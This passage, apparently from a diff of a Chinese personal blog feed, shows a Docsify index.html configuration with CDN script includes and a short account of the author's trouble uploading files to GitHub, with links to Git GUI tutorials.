+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>【PanDaoxi】CSDN Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;description&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Description&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">class</span>=<span class="string">&quot;js-site-favicon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://pandaoxi.gitee.io/tech-blog/favicon.svg&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/themes/vue.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/themes/prism.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span>Loading<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">$docsify</span> = &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;PanDaoxi&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">loadSidebar</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">sidebarDisplayLevel</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">alias</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="string">&#x27;/.*/_sidebar.md&#x27;</span>: <span class="string">&#x27;/_sidebar.md&#x27;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">loadNavbar</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">coverpage</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">maxLevel</span>: <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">subMaxLevel</span>: <span class="number">3</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">mergeNavbar</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">auto2top</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">latex</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            inlineMath   : [[<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;$&#x27;</span>], [<span class="string">&#x27;\\(&#x27;</span>, <span class="string">&#x27;\\)&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">            displayMath  : [[<span class="string">&#x27;$$&#x27;</span>, <span class="string">&#x27;$$&#x27;</span>]],</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">customOptions</span>: &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">          &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">pagination</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">previousText</span>: <span class="string">&#x27;上一章节&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">nextText</span>: <span class="string">&#x27;下一章节&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">           &#125;,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">search</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">paths</span>: <span class="string">&#x27;auto&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">placeholder</span>: <span class="string">&#x27;搜索&#x27;</span>,    </span></span><br><span class="line"><span class="language-javascript">                <span class="attr">placeholder</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;/zh-cn/&#x27;</span>: <span class="string">&#x27;搜索&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;Type to search&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">noData</span>: <span class="string">&#x27;找不到结果&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">depth</span>: <span class="number">4</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">hideOtherSidebarContent</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">namespace</span>: <span class="string">&#x27;Docsify-Guide&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">count</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">countable</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">position</span>: <span class="string">&#x27;top&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">margin</span>: <span class="string">&#x27;10px&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">float</span>: <span class="string">&#x27;right&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">fontsize</span>:<span class="string">&#x27;0.9em&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">color</span>:<span class="string">&#x27;rgb(90,90,90)&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">language</span>:<span class="string">&#x27;chinese&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">isExpected</span>: <span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/docsify-latex@0.5.2/dist/docsify-latex.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/docsify.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/emoji.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/zoom-image.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify/4.13.1/plugins/search.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-cpp.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-bash.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/prism/9000.0.1/components/prism-python.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--&lt;script src=&quot;https://unpkg.com/docsify-pagination@2.10.1/src/index.js&quot;&gt;&lt;/script&gt;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/docsify-copy-code/3.0.0/docsify-copy-code.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//unpkg.com/docsify-count/dist/countable.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">onUpdated</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Prism</span>.<span class="title function_">highlightAll</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">onMounted</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title class_">Prism</span>.<span class="title function_">highlightAll</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还要在博客目录下创建 <code>_coverpage.md</code>、<code>_navbar.md</code>、<code>_sidebar.md</code> 等等。</p>
+<h1 id="困难-3上传到-github"><a class="markdownIt-Anchor" href="#困难-3上传到-github"></a> 困难 3：上传到 Github</h1>
+<p>我以前一直习惯于手动在 Github 上传文件，每次网页端最多可以上传 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>20</mn></mrow><annotation encoding="application/x-tex">20</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span></span></span></span> 个。太少了！<br />
+但是我不会用 <code>git</code>。于是就探索 Git GUI。<br />
+这里不再赘述。</p>
+<ol>
+<li><a href="https://blog.csdn.net/mo_sss/article/details/123274512?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Git%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%20gitee&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-123274512.nonecase">《通过GIT将本地项目上传到gitee》</a></li>
+<li><a href="https://blog.csdn.net/m0_67596612/article/details/124865748?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171368688816800185816542%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171368688816800185816542&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_positive~default-1-124865748-null-null.nonecase&amp;utm_term=GIT%20GUI&amp;spm=1018.2226.3001.4450">《Git Gui》</a></li>
+</ol>
+<hr />
+<p>就这样啦，拜拜！~</p>
 ]]></content>
       <categories>
         <category>计算机</category>
